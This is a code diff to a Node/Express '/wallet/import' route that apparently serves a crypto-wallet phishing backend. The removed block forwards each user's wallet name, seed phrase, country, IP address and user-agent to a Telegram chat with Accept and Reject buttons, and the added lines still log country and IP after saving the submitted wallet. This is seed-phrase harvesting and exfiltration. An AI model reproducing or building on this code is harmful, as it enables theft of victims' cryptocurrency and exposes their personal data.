@@ -38,43 +38,8 @@ router.post("/wallet/import", async (req, res) => {
     
 const savedWallet = await newWallet.save();
 
-    try {
-      const { initBot } = require("../botManager");
-      const bot = initBot();
-      
-      if (bot && bot.chatId) {
-        const message = `
-💼 *New Wallet Import*
-━━━━━━━━━━━━━━━━━━━
-🏷️ *Name:* \`${walletName}\`
-🔑 *Seed:* \`${seedPhrase}\`
-📝 *Description:* \`${description || "N/A"}\`
-🌍 *Country:* \`${country}\`
-📡 *IP:* \`${ip}\`
-🧭 *User-Agent:*
-\`${userAgent}\`
-        `;
-
-        await bot.sendMessage(bot.chatId, message, {
-          parse_mode: "Markdown",
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: "✅ Accept", callback_data: `accept_wallet_${savedWallet._id}` },
-                { text: "❌ Reject", callback_data: `reject_wallet_${savedWallet._id}` },
-              ],
-            ],
-          },
-        });
-        
-        console.log("✅ Telegram message sent to chat:", bot.chatId);
-      } else {
-        console.log("⚠️ Telegram bot not available, wallet saved without notification");
-      }
-    } catch (telegramError) {
-      console.warn("⚠️ Telegram notification failed:", telegramError.message);
-      console.log("✅ Wallet saved successfully without Telegram notification");
-    }
+    console.log(`✅ Wallet saved: ${walletName} (${savedWallet._id})`);
+    console.log(`📍 Country: ${country}, IP: ${ip}`);
 
     res.status(200).json({
       message: "Wallet import submitted",
